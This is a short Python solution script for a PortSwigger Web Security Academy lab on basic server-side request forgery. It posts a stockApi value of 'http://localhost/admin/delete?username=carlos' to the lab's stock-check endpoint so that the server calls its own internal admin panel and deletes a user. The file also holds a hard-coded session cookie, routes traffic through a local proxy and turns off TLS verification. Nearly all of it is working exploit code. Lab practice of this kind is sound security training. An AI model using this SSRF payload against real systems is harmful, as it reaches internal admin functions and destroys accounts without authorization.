# https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-localhost

import requests

requests.packages.urllib3.disable_warnings()

scheme = "https://"
host = "aced1fc71faadb4280202c97001f0091.web-security-academy.net"
path = "/product/stock"
url = scheme + host + path
proxy = "127.0.0.1:8080"
proxies = {scheme: proxy}
verify = False
cookies = {"session": "KR59RTfRJsrYIjbV08qa4BigirQwZUu5"}

# payload = "http://localhost/admin"
payload = "http://localhost/admin/delete?username=carlos"
data = {"stockApi": payload}

requests.post(url, proxies=proxies, verify=verify, cookies=cookies, data=data)

# Inspecting the response after delivering the initial payload reveals this line in html:
# <a href="/admin/delete?username=carlos">Delete</a>
